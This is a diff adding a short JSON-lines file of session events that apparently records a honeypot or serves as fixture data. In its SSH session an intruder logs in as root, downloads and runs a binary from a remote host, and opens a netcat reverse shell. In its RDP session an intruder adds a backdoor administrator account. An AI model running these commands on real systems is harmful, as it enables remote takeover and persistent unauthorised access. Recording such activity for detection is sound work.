@@ -1,0 +1,11 @@
+{"ts": "2026-06-08T12:00:00+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "connect", "data": "banner=SSH-2.0-OpenSSH_8.2p1"}
+{"ts": "2026-06-08T12:00:01+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "auth", "data": "attempt=1 cred=root:123456 accepted=false"}
+{"ts": "2026-06-08T12:00:02+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "auth", "data": "attempt=2 cred=root:toor accepted=true"}
+{"ts": "2026-06-08T12:00:04+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "command", "data": "uname -a"}
+{"ts": "2026-06-08T12:00:06+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "command", "data": "wget http://185.220.101.7/bot -O /tmp/.x"}
+{"ts": "2026-06-08T12:00:08+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "command", "data": "chmod +x /tmp/.x"}
+{"ts": "2026-06-08T12:00:10+00:00", "src_ip": "185.220.101.7", "service": "ssh", "session_id": "a1b2c3", "kind": "command", "data": "/tmp/.x; nc 1.2.3.4 9001 -e /bin/sh"}
+{"ts": "2026-06-08T12:01:00+00:00", "src_ip": "92.63.197.10", "service": "rdp", "session_id": "d4e5f6", "kind": "auth", "data": "attempt=1 cred=administrator:Password1 accepted=false"}
+{"ts": "2026-06-08T12:01:02+00:00", "src_ip": "92.63.197.10", "service": "rdp", "session_id": "d4e5f6", "kind": "command", "data": "net user hacker P@ss123 /add"}
+{"ts": "2026-06-08T12:02:00+00:00", "src_ip": "10.0.0.55", "service": "http", "session_id": "g7h8i9", "kind": "command", "data": "GET /index.html"}
+{"ts": "2026-06-08T12:02:01+00:00", "src_ip": "10.0.0.55", "service": "http", "session_id": "g7h8i9", "kind": "command", "data": "GET /favicon.ico"}
